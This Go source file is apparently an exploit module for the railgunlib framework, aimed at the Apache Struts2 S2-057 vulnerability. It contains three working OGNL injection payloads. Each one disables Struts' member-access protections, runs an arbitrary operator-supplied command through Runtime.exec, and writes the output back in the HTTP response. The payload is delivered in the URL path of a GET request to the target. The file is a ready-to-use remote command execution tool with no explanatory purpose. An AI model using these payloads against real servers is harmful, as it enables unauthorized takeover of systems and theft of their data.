package exp_Struts2

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_S2_057 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_S2_057) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := "%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27lz520520%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
	cmd = url.PathEscape(cmd)
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)

	tmpSlice := strings.Split(self.Params.BaseParam.Target, "/")
	urlPath := strings.TrimSuffix(self.Params.BaseParam.Target, tmpSlice[len(tmpSlice)-1])
	target := urlPath + shellPayload + "/" + tmpSlice[len(tmpSlice)-1]
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_S2_057) Attack_cmd2() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := "%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27lz520520%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
	cmd = url.PathEscape(cmd)
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)

	tmpSlice := strings.Split(self.Params.BaseParam.Target, "/")
	urlPath := strings.TrimSuffix(self.Params.BaseParam.Target, tmpSlice[len(tmpSlice)-1])
	target := urlPath + shellPayload + "/" + tmpSlice[len(tmpSlice)-1]
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_S2_057) Attack_cmd3() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := "%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%27lz520520%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew++java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b51020%5d%2c%23c.read(%23d)%2c%23jas502n%3d+%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23jas502n.println(%23d+)%2c%23jas502n.close())%7d"
	cmd = url.PathEscape(cmd)
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)

	tmpSlice := strings.Split(self.Params.BaseParam.Target, "/")
	urlPath := strings.TrimSuffix(self.Params.BaseParam.Target, tmpSlice[len(tmpSlice)-1])
	target := urlPath + shellPayload + "/" + tmpSlice[len(tmpSlice)-1]
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}
func init() {

	exp_register.ExpStructRegister(&Exp_S2_057{}, "exp_S2_057.yml")
}
